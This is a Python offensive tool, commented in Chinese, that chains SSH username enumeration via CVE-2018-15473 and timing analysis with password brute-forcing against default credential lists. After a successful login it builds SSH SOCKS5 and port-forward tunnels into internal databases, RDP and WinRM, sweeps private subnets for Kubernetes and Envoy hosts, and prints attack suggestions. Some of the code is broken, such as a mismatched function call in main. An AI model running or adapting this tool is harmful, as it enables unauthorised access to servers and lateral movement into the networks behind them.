#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
First Door Attack Chain - CVE-2018-15473 + Time Side Channel + Auto Tunneling
"""

import asyncio
import time
import statistics
import struct
import socket
import subprocess
import paramiko
import threading
from paramiko.ssh_exception import SSHException, AuthenticationException
import os
import sys

# 导入云原生架构探测器
try:
    from .nginx_dos_analyzer import NginxDoSAnalyzer
except ImportError:
    # 如果相对导入失败，尝试绝对导入
    import sys
    import os
    sys.path.append(os.path.dirname(__file__))
    from nginx_dos_analyzer import NginxDoSAnalyzer

# CVE-2018-15473 核心实现
# --- Proxy support (can be set by caller) ---
PROXY_ENABLED = False
PROXY_URL = None

try:
    from python_socks.async_.asyncio import Proxy as SocksProxy
except Exception:
    SocksProxy = None

async def _async_open_connection(host, port, timeout=1.0):
    """Open connection with optional SOCKS5 proxy support."""
    
    # 🚨 SSH端口绕过代理限制 - 很多SOCKS5代理禁止SSH协议转发
    if port in [22, 2222, 22000] and PROXY_ENABLED and PROXY_URL:
        print(f"[*] SSH端口{port}检测到代理限制，尝试直连...")
        try:
            return await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout*2)
        except Exception as e:
            print(f"[*] SSH直连也失败: {e}")
            # 如果直连也失败，再尝试代理
    
    if PROXY_ENABLED and PROXY_URL and SocksProxy is not None:
        proxy = SocksProxy.from_url(PROXY_URL)
        sock = await asyncio.wait_for(proxy.connect(dest_host=host, dest_port=port), timeout=timeout)
        loop = asyncio.get_event_loop()
        reader = asyncio.StreamReader()
        protocol = asyncio.StreamReaderProtocol(reader)
        transport, _ = await loop.create_connection(lambda: protocol, sock=sock)
        writer = asyncio.StreamWriter(transport, protocol, reader, loop)
        return reader, writer
    else:
        return await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)

async def ssh_auth_timing(host, port, username, password, timeout=5.0):
    """利用CVE-2018-15473进行用户枚举的时间测量"""
    start_time = time.time()
    
    try:
        # 静默尝试连接，不输出调试信息
        try:
            reader, writer = await _async_open_connection(host, port, timeout=1.0)
        except (ConnectionRefusedError, OSError) as e:
            # 端口关闭或不可达，静默返回
            return 0
        except asyncio.TimeoutError:
            # 连接超时，静默返回
            return 0
            
        # 连接成功后才开始输出调试信息
        print(f"[DEBUG] SSH握手步骤1: 连接到 {host}:{port}")
        print(f"[DEBUG] SSH握手步骤1:  TCP连接成功")
        
        # SSH版本交换
        print(f"[DEBUG] SSH握手步骤2: 读取SSH版本banner")
        banner = await asyncio.wait_for(reader.readline(), timeout=timeout/2)
        if not banner.startswith(b'SSH-'):
            print(f"[DEBUG] SSH握手步骤2:  无效SSH banner: {banner}")
            writer.close()
            await writer.wait_closed()
            return 0
        print(f"[DEBUG] SSH握手步骤2:  SSH banner: {banner.decode().strip()}")
            
        writer.write(b'SSH-2.0-CVE_2018_15473_Scanner\r\n')
        await writer.drain()
        print(f"[DEBUG] SSH握手步骤3:  发送客户端版本标识")
        
        # 发送KEX初始化
        print(f"[DEBUG] SSH握手步骤4: 发送KEX初始化包")
        kex_packet = build_kex_init_packet()
        writer.write(kex_packet)
        await writer.drain()
        print(f"[DEBUG] SSH握手步骤4:  KEX初始化包发送完成")
        
        # 读取服务器KEX响应
        print(f"[DEBUG] SSH握手步骤5: 等待服务器KEX响应")
        await asyncio.wait_for(reader.read(1024), timeout=timeout/2)
        print(f"[DEBUG] SSH握手步骤5:  收到服务器KEX响应")
        
        # 发送KEX DH GEX请求
        print(f"[DEBUG] SSH握手步骤6: 发送DH GEX请求")
        gex_request = build_gex_request()
        writer.write(gex_request)
        await writer.drain()
        print(f"[DEBUG] SSH握手步骤6:  DH GEX请求发送完成")
        
        # 读取GEX响应
        print(f"[DEBUG] SSH握手步骤7: 等待GEX响应")
        await asyncio.wait_for(reader.read(1024), timeout=timeout/2)
        print(f"[DEBUG] SSH握手步骤7:  收到GEX响应")
        
        # 发送KEX DH GEX初始化
        print(f"[DEBUG] SSH握手步骤8: 发送GEX初始化")
        gex_init = build_gex_init()
        writer.write(gex_init)
        await writer.drain()
        print(f"[DEBUG] SSH握手步骤8:  GEX初始化发送完成")
        
        # 读取GEX回复
        print(f"[DEBUG] SSH握手步骤9: 等待GEX回复")
        await asyncio.wait_for(reader.read(1024), timeout=timeout/2)
        print(f"[DEBUG] SSH握手步骤9:  收到GEX回复")
        
        # 发送用户认证请求 (这里触发CVE-2018-15473)
        print(f"[DEBUG] SSH握手步骤10: 发送用户认证请求 (用户名: {username})")
        auth_request = build_userauth_request(username)
        writer.write(auth_request)
        await writer.drain()
        print(f"[DEBUG] SSH握手步骤10:  用户认证请求发送完成")
        
        # 等待认证响应 - 这里的时间差异是关键
        print(f"[DEBUG] SSH握手步骤11: 等待认证响应 (CVE-2018-15473关键时序点)")
        try:
            response = await asyncio.wait_for(reader.read(1024), timeout=timeout/2)
            print(f"[DEBUG] SSH握手步骤11:  收到认证响应，长度: {len(response)}")
            # 有效用户名会有更复杂的处理路径，时间稍长
        except asyncio.TimeoutError:
            print(f"[DEBUG] SSH握手步骤11:  认证响应超时 (这是正常的)")
            pass
            
        writer.close()
        await writer.wait_closed()
        
    except (ConnectionRefusedError, OSError) as e:
        # 连接被拒绝，静默返回
        return 0
    except Exception as e:
        # 其他异常才输出调试信息
        if "connection" not in str(e).lower():
            print(f"[DEBUG] SSH握手异常: {type(e).__name__}: {str(e)}")
        pass  # 异常也是正常的，专注于时间测量
    
    elapsed_ms = int((time.time() - start_time) * 1000)
    # 只有成功执行了SSH握手才输出总耗时
    if elapsed_ms > 0:
        print(f"[DEBUG] SSH握手完成，总耗时: {elapsed_ms}ms")
    return elapsed_ms

def build_kex_init_packet():
    """构造KEX初始化包"""
    msg_kexinit = 20
    cookie = os.urandom(16)
    
    # 简化的算法列表
    kex_algos = b'diffie-hellman-group-exchange-sha256'
    host_algos = b'ssh-rsa'
    enc_algos = b'aes128-ctr'
    mac_algos = b'hmac-sha2-256'
    comp_algos = b'none'
    langs = b''
    
    def ssh_string(s):
        return struct.pack('>I', len(s)) + s
    
    payload = struct.pack('B', msg_kexinit) + cookie
    payload += ssh_string(kex_algos)
    payload += ssh_string(host_algos) 
    payload += ssh_string(enc_algos)  # client to server
    payload += ssh_string(enc_algos)  # server to client
    payload += ssh_string(mac_algos)  # client to server
    payload += ssh_string(mac_algos)  # server to client
    payload += ssh_string(comp_algos) # client to server
    payload += ssh_string(comp_algos) # server to client
    payload += ssh_string(langs)      # client to server
    payload += ssh_string(langs)      # server to client
    payload += b'\x00'               # first_kex_packet_follows
    payload += b'\x00\x00\x00\x00'     # reserved
    
    # 添加SSH包头
    packet_len = len(payload) + 1 + 4  # +1 for padding_len, +4 for random padding
    padding_len = 4
    padding = os.urandom(padding_len)
    
    packet = struct.pack('>I', packet_len)
    packet += struct.pack('B', padding_len)
    packet += payload
    packet += padding
    
    return packet

def build_gex_request():
    """构造DH GEX请求包"""
    msg_kex_dh_gex_request = 34
    min_bits = 1024
    preferred_bits = 2048
    max_bits = 8192
    
    payload = struct.pack('B', msg_kex_dh_gex_request)
    payload += struct.pack('>III', min_bits, preferred_bits, max_bits)
    
    padding_len = 4
    padding = os.urandom(padding_len)
    packet_len = len(payload) + padding_len + 1
    
    packet = struct.pack('>I', packet_len)
    packet += struct.pack('B', padding_len) 
    packet += payload
    packet += padding
    
    return packet

def build_gex_init():
    """构造DH GEX初始化包"""
    msg_kex_dh_gex_init = 32
    #技术债务 时间原因
    # 生成假的DH公钥 (简化实现) 
    fake_pubkey = os.urandom(256)  # 2048位密钥
    
    def ssh_mpint(n):
        if isinstance(n, bytes):
            data = n
        else:
            data = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        
        if data[0] & 0x80:
            data = b'\x00' + data
        
        return struct.pack('>I', len(data)) + data
    
    payload = struct.pack('B', msg_kex_dh_gex_init)
    payload += ssh_mpint(fake_pubkey)
    
    padding_len = 4
    padding = os.urandom(padding_len)
    packet_len = len(payload) + padding_len + 1
    
    packet = struct.pack('>I', packet_len)
    packet += struct.pack('B', padding_len)
    packet += payload 
    packet += padding
    
    return packet

def build_userauth_request(username):
    """构造用户认证请求包 - CVE-2018-15473触发点"""
    msg_userauth_request = 50
    
    def ssh_string(s):
        if isinstance(s, str):
            s = s.encode('utf-8')
        return struct.pack('>I', len(s)) + s
    
    payload = struct.pack('B', msg_userauth_request)
    payload += ssh_string(username)        # user name
    payload += ssh_string('ssh-connection') # service name
    payload += ssh_string('publickey')      # method name
    payload += b'\x01'                     # has signature
    payload += ssh_string('ssh-rsa')        # algorithm name
    payload += ssh_string(os.urandom(256))  # fake public key blob
    payload += ssh_string(os.urandom(256))  # fake signature
    
    padding_len = 4
    padding = os.urandom(padding_len)
    packet_len = len(payload) + padding_len + 1
    
    packet = struct.pack('>I', packet_len)
    packet += struct.pack('B', padding_len)
    packet += payload
    packet += padding
    
    return packet

# 新增：纯同步版本
def _ssh_auth_attempt_sync(host, port, username, password, timeout=10.0):
    """实际的SSH认证尝试（同步版本）"""
    import paramiko
    from paramiko.ssh_exception import AuthenticationException
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # If proxy is enabled, create a proxied socket and pass it to paramiko
        sock = None
        if PROXY_ENABLED and PROXY_URL and SocksProxy is not None:
            import asyncio as _aio
            async def _mk():
                proxy = SocksProxy.from_url(PROXY_URL)
                return await proxy.connect(dest_host=host, dest_port=port)
            sock = _aio.run(_mk())
            try:
                sock.settimeout(timeout)
            except Exception:
                pass
        
        client.connect(
            hostname=host,
            port=port, 
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
            sock=sock
        )
        
        # 测试连接是否真正可用
        stdin, stdout, stderr = client.exec_command('echo test')
        result = stdout.read().decode().strip()
        
        client.close()
        return result == 'test'
        
    except AuthenticationException:
        return False
    except Exception:
        return False

# SSH认证尝试（异步包装）
async def ssh_auth_attempt(host, port, username, password, timeout=10.0):
    """实际的SSH认证尝试"""
    import asyncio
    return await asyncio.to_thread(_ssh_auth_attempt_sync, host, port, username, password, timeout)

# SSH隧道执行（异步版本）
async def execute_tunnel_async(tunnel_cmd, test_port=None):
    """执行SSH隧道命令并测试连通性"""
    import shlex, asyncio
    try:
        # If a SOCKS proxy is configured for outbound, preserve env if needed
        env = None
        if PROXY_ENABLED and PROXY_URL:
            env = {**os.environ}
            env['ALL_PROXY'] = PROXY_URL
        proc = await asyncio.create_subprocess_exec(
            *shlex.split(tunnel_cmd),
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            env=env
        )
        await asyncio.sleep(2)  # 非阻塞等待

        if test_port:
            try:
                reader, writer = await asyncio.open_connection('127.0.0.1', int(test_port))
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                return True
            except Exception:
                return False
        return True
        
    except Exception:
        return False

# SSH隧道执行（保持向后兼容）
def execute_tunnel(tunnel_cmd, test_port=None):
    """执行SSH隧道命令并测试连通性"""
    try:
        # 执行SSH隧道命令 (后台运行)
        process = subprocess.Popen(
            tunnel_cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        
        # 等待隧道建立
        time.sleep(2)
        
        # 如果指定了测试端口，测试连通性
        if test_port:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex(('127.0.0.1', test_port))
                sock.close()
                return result == 0
            except:
                return False
        
        return True
        
    except Exception as e:
        return False

async def cve_2018_15473_enum(host, port, userlist, timeout=5.0):
    """CVE-2018-15473用户枚举 + 微时间差分析"""
    
    # 首先检查端口是否可达
    print(f"[*] Checking SSH service availability on {host}:{port}...")
    test_time = await ssh_auth_timing(host, port, "test", "test", timeout)
    if test_time == 0:
        print(f"[-] SSH service not available on {host}:{port}")
        return [], {
            'status': 'SERVICE_UNAVAILABLE',
            'reason': f'SSH service not reachable on {host}:{port}',
            'tested_users': 0,
            'baseline_established': False
        }
    
    print(f"[+] SSH service is available, proceeding with enumeration...")
    
    # 时间基线测试
    baseline_times = []
    for _ in range(10):
        start = time.time()
        # 发送无效用户名的认证请求
        invalid_time = await ssh_auth_timing(host, port, "nonexistent_user_999", "fake", timeout)
        if invalid_time == 0:
            print(f"[-] SSH service became unavailable during baseline test")
            return [], {
                'status': 'CONNECTION_LOST',
                'reason': 'SSH service became unavailable during baseline establishment',
                'baseline_samples': len(baseline_times),
                'tested_users': 0
            }
        baseline_times.append(invalid_time)
    
    baseline_avg = statistics.mean(baseline_times)
    baseline_std = statistics.stdev(baseline_times)
    
    valid_users = []
    timing_profiles = {}
    
    for username in userlist:
        times = []
        for _ in range(5):  # 多次采样
            auth_time = await ssh_auth_timing(host, port, username, "testpass", timeout)
            times.append(auth_time)
        
        avg_time = statistics.mean(times)
        time_variance = statistics.stdev(times) if len(times) > 1 else 0
        
        # 时间差分析
        time_diff = avg_time - baseline_avg
        significance = abs(time_diff) / baseline_std if baseline_std > 0 else 0
        
        timing_profiles[username] = {
            'avg_time': avg_time,
            'variance': time_variance, 
            'diff_from_baseline': time_diff,
            'significance': significance
        }
        
        # 判定用户存在（时间差异显著）
        if significance > 1.0:  # 1倍标准差（降低阈值）
            valid_users.append(username)
            
    return valid_users, timing_profiles
    
    
async def optimized_bruteforce(host, port, valid_users, timing_profiles, passlist):
    """基于时间侧信道的智能密码爆破"""
    
    # 根据时间特征排序用户（越特殊的用户越可能是管理员）
    priority_users = sorted(valid_users, 
                          key=lambda u: timing_profiles[u]['significance'], 
                          reverse=True)
    
    successful_creds = []
    
    for username in priority_users:
        print(f"[*] Targeting {username} (significance: {timing_profiles[username]['significance']:.2f})")
        
        # 密码优先级（基于用户名特征）
        if username in ['admin', 'root', 'administrator']:
            priority_passwords = ['admin', 'password', 'root', '123456'] + passlist
        else:
            priority_passwords = passlist
            
        for password in priority_passwords:
            try:
                # 实际认证尝试
                success = await ssh_auth_attempt(host, port, username, password)
                if success:
                    successful_creds.append((username, password))
                    print(f"[+] SUCCESS: {username}:{password}")
                    
                    # 立即建立隧道，不等所有爆破完成
                    await auto_establish_tunnels(host, port, username, password)
                    break
                    
            except Exception as e:
                continue
                
        # 如果已经获得高权限用户，可以停止
        if successful_creds and username in ['root', 'admin']:
            break
            
    return successful_creds
    
    
async def auto_establish_tunnels(host, port, username, password):
    """自动建立SSH隧道基础设施 + 自动云原生架构探测"""
    
    print(f"[*] Auto-establishing tunnels via {username}@{host}:{port}")
    
    # 1. 动态SOCKS5代理 (最重要)
    socks_port = 9999
    socks_cmd = f"ssh -D {socks_port} -N -f {username}@{host} -p {port}"
    
    # 建立SOCKS5代理
    print(f"[*] Establishing SOCKS5 proxy on port {socks_port}...")
    if await execute_tunnel_async(socks_cmd, socks_port):
        print(f"[+] SOCKS5 proxy established: 127.0.0.1:{socks_port}")
        
        # 关键集成点：自动触发内网云原生架构扫描
        await auto_cloud_native_discovery(host, socks_port)
        
    else:
        print(f"[-] Failed to establish SOCKS5 proxy")
    
    # 2. 常见内网端口转发
    common_forwards = [
        ("3306", "MySQL"),          # 数据库
        ("1433", "MSSQL"), 
        ("5432", "PostgreSQL"),
        ("6379", "Redis"),
        ("27017", "MongoDB"),
        ("80", "HTTP"),             # Web服务
        ("443", "HTTPS"),
        ("8080", "HTTP-Alt"),
        ("3389", "RDP"),            # 远程桌面
        ("5985", "WinRM"),          # Windows管理
        ("22", "SSH"),              # 其他SSH
    ]
    
    established_tunnels = []
    local_port = 10000
    
    for remote_port, service in common_forwards:
        try:
            # 尝试建立端口转发
            tunnel_cmd = f"ssh -L {local_port}:localhost:{remote_port} -N -f {username}@{host} -p {port}"
            
            # 实际建立SSH隧道
            if await execute_tunnel_async(tunnel_cmd, local_port):
                established_tunnels.append({
                    'service': service,
                    'local_port': local_port,
                    'remote_port': remote_port,
                    'tunnel_cmd': tunnel_cmd,
                    'status': 'active'
                })
                print(f"[+] Tunnel established: {service} 127.0.0.1:{local_port} -> {remote_port}")
            else:
                print(f"[-] Failed to establish tunnel for {service}:{remote_port}")
            
            local_port += 1
            
        except Exception:
            continue
    
    # 3. 内网探测准备
    recon_script = generate_internal_recon_script()
    
    return {
        'socks_proxy': f"socks5://127.0.0.1:{socks_port}",
        'tunnels': established_tunnels,
        'recon_script': recon_script
    }

async def auto_cloud_native_discovery(target_host, socks_port):
    """自动云原生架构发现和攻击建议 - 集成nginx_dos_analyzer"""
    
    print(f"\n[*] ============ 自动云原生架构探测启动 ============")
    print(f"[*] 通过SOCKS5代理探测内网云原生架构...")
    print(f"[*] 代理地址: 127.0.0.1:{socks_port}")
    
    try:
        # 创建云原生架构分析器实例
        analyzer = NginxDoSAnalyzer(target_host)
        
        # SOCKS5代理配置
        proxy_info = {
            'host': '127.0.0.1',
            'port': socks_port
        }
        
        print(f"[*] 开始内网云原生集群扫描...")
        
        # 调用内网集群扫描 - 关键集成点！
        cluster_results = await analyzer.internal_cluster_scan(
            proxy_info=proxy_info,
            target_networks=[
                '192.168.1.0/24',    # 常见内网网段
                '192.168.0.0/24',
                '10.0.0.0/24',
                '172.16.0.0/24'
            ]
        )
        
        # 展示扫描结果
        print(f"\n[*] ============ 云原生架构扫描结果 ============")
        scan_summary = cluster_results.get('scan_summary', {})
        print(f"[+] 扫描网段: {scan_summary.get('networks_scanned', 0)} 个")
        print(f"[+] 发现主机: {scan_summary.get('hosts_discovered', 0)} 台")
        print(f"[+] 云原生主机: {scan_summary.get('cloud_native_hosts', 0)} 台")
        print(f"[+] 总端点数: {scan_summary.get('total_endpoints', 0)} 个")
        
        # 展示发现的云原生集群
        cloud_native_clusters = cluster_results.get('cloud_native_clusters', [])
        if cloud_native_clusters:
            print(f"\n[+] 发现云原生集群主机:")
            for i, host_info in enumerate(cloud_native_clusters[:5], 1):  # 只显示前5台
                ip = host_info['ip']
                score = host_info['cloud_native_score']
                services = [s['type'] for s in host_info['services']]
                print(f"  [{i}] {ip} (分数: {score}) - 服务: {', '.join(services)}")
                
                # 高价值目标标记
                if host_info.get('k8s_detected'):
                    print(f"      [!] KUBERNETES集群节点!")
                if host_info.get('envoy_detected'):
                    print(f"      [!] ENVOY服务网格!")
        
        # 展示攻击建议
        attack_recommendations = cluster_results.get('attack_recommendations', [])
        if attack_recommendations:
            print(f"\n[*] 攻击建议:")
            for i, recommendation in enumerate(attack_recommendations[:8], 1):
                print(f"  [{i}] {recommendation}")
        
        # 集群分析结果
        cluster_analysis = cluster_results.get('cluster_analysis', {})
        if cluster_analysis:
            arch_type = cluster_analysis.get('cluster_architecture', 'Unknown')
            security_posture = cluster_analysis.get('security_posture', 'Unknown')
            print(f"\n[*] 架构类型: {arch_type}")
            print(f"[*] 安全态势: {security_posture}")
            
            # 高优先级攻击目标
            attack_priority = cluster_analysis.get('attack_priority', [])
            if attack_priority:
                print(f"\n[!] 高优先级攻击目标:")
                for target in attack_priority:
                    print(f"  - {target['ip']}:{target['port']} ({target['service']})")
        
        print(f"\n[*] ============ 自动云原生探测完成 ============")
        
        # 如果发现云原生架构，继续深度分析
        if cloud_native_clusters:
            await auto_cloud_native_deep_analysis(analyzer, cloud_native_clusters[0]['ip'], proxy_info)
        
        return cluster_results
        
    except Exception as e:
        print(f"[-] 云原生架构探测失败: {e}")
        return None

async def auto_cloud_native_deep_analysis(analyzer, target_ip, proxy_info):
    """对发现的云原生主机进行深度分析"""
    
    print(f"\n[*] ============ 深度云原生架构分析 ============")
    print(f"[*] 目标: {target_ip}")
    
    try:
        # 创建专门针对该主机的分析器
        target_analyzer = NginxDoSAnalyzer(target_ip, target_port=15000)  # Envoy默认管理端口
        
        # 检测云原生架构特征 - 内网模式
        print(f"[*] 检测云原生架构特征...")
        architecture_result = await target_analyzer.detect_cloud_native_architecture(
            scan_mode='internal',
            proxy_info=proxy_info,
            progressive=True
        )
        
        arch_type = architecture_result.get('architecture_type', 'Unknown')
        confidence = architecture_result.get('confidence', 0)
        
        print(f"[+] 架构类型: {arch_type} (置信度: {confidence:.2f})")
        
        # 展示安全影响
        security_implications = architecture_result.get('security_implications', [])
        if security_implications:
            print(f"[*] 安全影响:")
            for implication in security_implications[:5]:
                print(f"  - {implication}")
        
        # 展示攻击建议
        attack_recommendations = architecture_result.get('attack_recommendations', [])
        if attack_recommendations:
            print(f"[*] 针对性攻击建议:")
            for rec in attack_recommendations[:5]:
                print(f"  - {rec}")
        
        # 内网暴露评估
        internal_exposure = architecture_result.get('internal_exposure', 'Unknown')
        print(f"[*] 内网暴露级别: {internal_exposure}")
        
        print(f"[*] ============ 深度分析完成 ============")
        
        return architecture_result
        
    except Exception as e:
        print(f"[-] 深度架构分析失败: {e}")
        return None

def generate_internal_recon_script():
    """生成内网探测脚本"""
    return """
# 自动内网探测脚本
echo "[*] Internal network reconnaissance started"

# 网络接口信息
ip addr show

# ARP表（发现其他主机）
arp -a

# 路由表（发现其他网段）
route -n

# 监听端口
netstat -tulpn

# 进程信息
ps aux

# 内网主机发现
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo "192.168.1.$i is alive" &
    ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo "10.0.0.$i is alive" &
    ping -c 1 -W 1 172.16.0.$i >/dev/null 2>&1 && echo "172.16.0.$i is alive" &
done
wait

echo "[*] Reconnaissance completed"
"""


async def first_door_attack(target_host, target_port=22):
    """第一扇门完整攻击链"""
    
    print("[*] Phase 1: User enumeration via CVE-2018-15473")
    userlist = ['root', 'admin', 'administrator', 'user', 'guest', 'ubuntu', 'centos']
    valid_users, timing_profiles = await cve_2018_15473_enum(target_host, target_port, userlist)
    
    if not valid_users:
        print("[-] No valid users found")
        return False
        
    print(f"[+] Found {len(valid_users)} valid users: {valid_users}")
    
    print("[*] Phase 2: Optimized credential attack")
    passlist = ['password', 'admin', '123456', 'root', 'toor']
    creds = await optimized_bruteforce(target_host, target_port, valid_users, timing_profiles, passlist)
    
    if creds:
        print(f"[+] Successfully compromised: {creds}")
        print("[*] Phase 3: Tunnels established, ready for internal reconnaissance")
        return True
    else:
        print("[-] Failed to obtain credentials")
        return False

async def selftest(target="127.0.0.1", timeout=3.0, verbose=True):
    """time_mch模块自检"""
    if verbose:
        print("[*] time_mch selftest starting...")
    
    try:
        # 测试CVE-2018-15473用户枚举
        if verbose:
            print("  [+] Testing CVE-2018-15473 user enumeration...")
        
        userlist = ['root', 'admin']
        valid_users, timing_profiles = await cve_2018_15473_enum(target, 22, userlist, timeout)
        
        if verbose:
            print("  [+] time_mch selftest completed successfully")
        return True
        
    except Exception as e:
        if verbose:
            print(f"  [-] time_mch selftest failed: {e}")
        return False

def main():
    import argparse
    import sys
    import asyncio
    
    parser = argparse.ArgumentParser(description="SSH Attack & Tunnel Management (time_mch)")
    parser.add_argument("--selftest", action="store_true", help="Run module self-test")
    parser.add_argument("--target", default="127.0.0.1", help="Target hostname (for selftest)")
    parser.add_argument("host", nargs="?", help="Target hostname (for attack)")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Timeout seconds")
    parser.add_argument("--userlist", help="User list file")
    parser.add_argument("--passlist", help="Password list file")
    
    args = parser.parse_args()
    
    if args.selftest:
        try:
            result = asyncio.run(selftest(args.target, args.timeout))
            sys.exit(0 if result else 1)
        except KeyboardInterrupt:
            print("\n[!] Selftest interrupted")
            sys.exit(1)
        return
    
    if not args.host:
        parser.error("host argument is required when not using --selftest")
    
    async def run_attack():
        # 加载用户列表
        if args.userlist:
            with open(args.userlist, 'r') as f:
                userlist = [line.strip() for line in f if line.strip()]
        else:
            userlist = ['root', 'admin', 'administrator', 'ubuntu', 'user']
        
        # 加载密码列表  
        if args.passlist:
            with open(args.passlist, 'r') as f:
                passlist = [line.strip() for line in f if line.strip()]
        else:
            passlist = ['password', 'admin', '123456', 'root', 'toor']
        
        # 执行攻击
        result = await first_door_attack(args.host, args.port, userlist, passlist, args.timeout)
        return result
    
    try:
        success = asyncio.run(run_attack())
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()